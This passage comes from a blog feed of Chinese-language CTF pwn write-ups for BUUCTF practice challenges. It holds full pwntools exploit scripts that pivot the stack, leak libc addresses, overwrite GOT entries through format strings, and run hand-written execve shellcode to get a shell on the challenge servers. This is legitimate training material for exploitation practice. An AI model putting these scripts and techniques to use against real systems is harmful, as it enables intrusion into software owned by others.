punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ciscn_2019_s_4\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_s_4\">#</a> ciscn_2019_s_4</h2>\n<p>ret2libc2 栈迁移</p>\n<p>字符串溢出最多到返回地址处，因此将栈迁移到字符串 buf 起始位置。</p>\n<p>在迁移前需要得知栈上地址，第一次 read 输入 0x28 字节刚好到达旧 ebp 位置，获取其地址，计算偏移为 - 0x38，得到 buf 的地址。</p>\n<p>第二次构造 payload 时，先空出 4 字节给 ebp，然后接 system 的 plt 地址、返回地址以及字符串的地址，之后再接’/bin/sh\\0’字符串。因此字符串地址应该为 buf 地址加 16。之后填充至旧 ebp 处，用 buf 地址替换旧 ebp，而返回地址填入 leave;ret 地址。</p>\n<p>不知道 buu 在发什么颠，getshell 后就退出控制了，所以选择用 cat flag 命令。</p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\ncontext(log_level='debug')\n#e=ELF('./')\n#p=process('./ciscn_s_4')\np=remote('node4.buuoj.cn',25150)\n#gdb.attach(p, 'b read')\n\noffset = 0x028\npayload = b'a'*(offset-1) + b'b' \n\np.sendafter('your name?',payload)\np.recvuntil(b'ab')\nebp = u32(p.recv(4))\nprint('the ebp is 0x%x'%ebp)\n\nbuf = ebp - 0x38\nsys = 0x8048400\nsys_c = 0x08048559\nleave_ret = 0x080485FD\npayload =  p32(ebp)+ p32(sys) + p32(sys_c) + p32(buf+0x10) + b'cat flag\\0'\nassert len(payload) &lt;= offset\npayload = payload.ljust(offset,b'a') + p32(buf) +p32(leave_ret)\np.send(payload)\np.interactive()\n</code></pre>\n<h2 id=\"wustctf2020_closed\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_closed\">#</a> *wustctf2020_closed</h2>\n<p>这题题目给了 shell 函数，直接执行 system (‘/bin/sh’) 但是执行了 close (2) 和 close (1)，关闭了标准输出和错误输出。</p>\n<p>解决方法是用 bash 命令重定向输出到标准输入。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">exec</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span><span class=\"token file-descriptor important\">&amp;0</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230915002630116.png\" alt=\"image-20230915002630116\"></p>\n<h2 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h2>\n<p>泄露 cca8 处的栈地址，为第 2 个格式参数。得到 ccbf，目标地址 cefc，偏移为 cefc-ccbf=23d。</p>\n<p>字符串头取 cdcc 处，为第 (cdcc-cca0)/4=4b 个格式参数。</p>\n<p>修改 format 末端</p>\n<p><img data-src=\"./image-20230915100049886.png\" alt=\"image-20230915100049886\"></p>\n<h2 id=\"-2\"><a class=\"markdownIt-Anchor\" href=\"#-2\">#</a> </h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt32'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt32'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27454</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x0804867D')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>memset_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'memset'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%2$p'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">+=</span> <span class=\"token number\">0x23d</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of ret %#x'</span><span class=\"token operator\">%</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'aaa'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%75$s'</span> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#payload = b'aaaa'+b'%75$p'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'baa'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>content<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'd%75$hn'</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\">#assert len(payload) &lt;=6</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of sys %#x'</span><span class=\"token operator\">%</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'baa'</span><span class=\"token operator\">+</span>fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>memset_g<span class=\"token punctuation\">:</span>sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#payload = b'aaa'+fmtstr_payload(75,&#123;ret:sys_a&#125;, 12,'byte')</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b';/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"pwnable_start\"><a class=\"markdownIt-Anchor\" href=\"#pwnable_start\">#</a> pwnable_start</h2>\n<p>ret2shellcode ret2syscall 汇编</p>\n<p>没有栈不可执行保护，所以选择 ret2shellcode，其次该程序很简洁，函数调用均使用系统调用。</p>\n<p>先泄露栈上地址。第一次返回后 esp 刚好指向一个栈地址。其次 write 系统调用的 buf 地址直接取当时的 esp。因此将返回地址修改到 write 前面，即可实现泄露地址。泄露的地址与 ret 后可输入的 buf 地址（即 ret 后 esp 地址）偏差为 cfdc-cfe0=4。（返回到 mov ecx, esp 处。因为 write 和 read 系统调用均已 ecx 为输入输出处，所以可控制栈内存起始处就是 esp 处。</p>\n<p><img data-src=\"./image-20230917173934650.png\" alt=\"image-20230917173934650\"></p>\n<p>由于只能输入 3c 个字符，0x14 处为返回地址，而之后仅剩 3c-14=0x28 个字节可输入，而 shellcode 有 2c 个字节，不够写。所以自己写一个 shellcode。</p>\n<p>在第一次输入时顺便写入 /bin/sh 字符，第二次构造 shellocde 时直接把第一次输入的地址传入 ebx 寄存器。地址与第二次 ret 后 esp 的偏差为 (0x14+0x4)*2=0x30。之后把 eax, ecx, edx 的值分别设置即可。</p>\n<pre><code class=\"language-assembly\">sub esp, 0x030; \nmov ebx, esp; \nxor ecx, ecx; \nxor edx, edx; \npush 0xb; \npop eax; \nint 0x80;\n</code></pre>\n<p>长度为 0xE</p>\n<p>完整代码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./start')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25028</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b 0x08048087')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x014</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>tar1 <span class=\"token operator\">=</span> <span class=\"token number\">0x08048087</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>tar1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'CTF:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>addr1 <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>addr2 <span class=\"token operator\">=</span> addr1<span class=\"token operator\">-</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>assem<span class=\"token operator\">=</span><span class=\"token string\">'sub esp, 0x030; mov ebx, esp; xor ecx, ecx; xor edx, edx; push 0xb; pop eax; int 0x80;'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>addr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"-3\"><a class=\"markdownIt-Anchor\" href=\"#-3\">#</a> </h2>\n<h2 id=\"axb_2019_fmt64\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_fmt64\">#</a> axb_2019_fmt64</h2>\n<p>64 位为寄存器传参，第 7 位参数开始才放在栈上。</p>\n<p><img data-src=\"./image-20230919172840631.png\" alt=\"image-20230919172840631\"></p>\n<p>可控制的字符串位置为 db50（前一个有个冒号）栈上参数起始位置为 db40</p>\n<p>所以参数偏移为 6+(0xdb50 - 0xdb40)/0x8 = 0x8=8</p>\n<p>已填充字符个数为 9</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#=process('./axb_2019_fmt64')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29294</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#db.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%9$s'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of sys %#x'</span><span class=\"token operator\">%</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>printf_g<span class=\"token punctuation\">:</span>sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b';/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有一点是该程序里有个 sprintf 进行字符串转移，所以转移时会被’\\0’截断，并且切断后还会加个回车字符。所以地址只能取 s 变量处的而不能取 format 处的。之前 32 位程序代码几乎一样，但是我读取的是 format 处的字符串，所以迁移程序的时候卡了好久。</p>\n<p>这个程序迁移回 32 位就简单多了。</p>\n<h2 id=\"hitcontraining_magicheap\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_magicheap\">#</a> hitcontraining_magicheap</h2>\n",
            "tags": [
                "heap",
                "stack migration"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/08/buu-0830/",
            "url": "http://waltcsz.github.io/2023/08/buu-0830/",
            "title": "buu 0830",
            "date_published": "2023-08-31T11:19:24.000Z",
            "content_html": "<h2 id=\"pwn2_sctf_2016\"><a class=\"markdownIt-Anchor\" href=\"#pwn2_sctf_2016\">#</a> pwn2_sctf_2016</h2>\n<p>靶场问题，本地能解远程不能解。</p>\n<h2 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h2>\n<p>fmt</p>\n<p>主函数给了 printf 漏洞，需要偏移 11 个参数，然后修改 bss 段中 x 的值。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27176</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./fm')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0804A02C</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'%11$n'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"jarvisoj_level3\"><a class=\"markdownIt-Anchor\" href=\"#jarvisoj_level3\">#</a> jarvisoj_level3</h2>\n<p>ret2libc3</p>\n<h2 id=\"picoctf_2018_rop-chain\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_rop-chain\">#</a> picoctf_2018_rop chain</h2>\n<p>rop chain</p>\n<p>有后门函数，但要求 win1 和 win2 的值不为 0，且函数传参 a1 为指定值。</p>\n<p><img data-src=\"./image-20230831022046831-1698319155284-20-1698319162494-22.png\" alt=\"image-20230831022046831\"></p>\n<p>有两个自定义函数可以修改 win1 和 win2 的值，其中 win_function2 中要求传参指定值且 win1 已经修改。</p>\n<p><img data-src=\"./image-20230831022104071.png\" alt=\"image-20230831022104071\"></p>\n<p>构造 payload，先调用 